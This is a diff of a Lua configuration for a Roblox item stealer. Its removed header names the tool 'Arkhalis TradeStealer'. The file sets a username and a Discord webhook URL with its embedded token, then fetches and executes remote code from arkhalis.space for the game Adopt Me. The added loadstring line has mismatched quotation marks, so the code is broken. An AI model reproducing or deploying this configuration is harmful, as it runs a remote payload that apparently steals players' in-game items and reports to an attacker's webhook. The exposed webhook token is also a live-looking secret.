@@ -1,14 +1,6 @@
---[[
-       ▀█▀ █▀█ ▄▀▄ █▀▄ █▀▀ █▀▀ ▀█▀ █▀▀ ▄▀▄ █   █▀▀ █▀█ 
-        █  █▀▄ █▀█ █▄▀ ██▄ ▄██  █  ██▄ █▀█ █▄▄ ██▄ █▀▄  
---]]
+Username= 'blacki112999'
+Webhook= 'https://discord.com/api/webhooks/1279165457542152232/kdC6iIlU6swp1PUzXolVXSQUIOXGurkc5WkY1kUj405fITY1DrlfEsaIyKKcYtQMCfiv'
 
---[ Arkhalis TradeStealer --]
+MinimumRAP = 1
 
---[ Main Config --]
-
-Username = "blacki112999"
-Webhook = "https://discord.com/api/webhooks/1279165457542152232/kdC6iIlU6swp1PUzXolVXSQUIOXGurkc5WkY1kUj405fITY1DrlfEsaIyKKcYtQMCfiv"
-
---[ Excutable Loadstring --]
-loadstring(game:HttpGet("https://arkhalis.space/adoptme.lua"))()
+loadstring(game:HttpGet('https://arkhalis.space/adoptme.lua", true))()
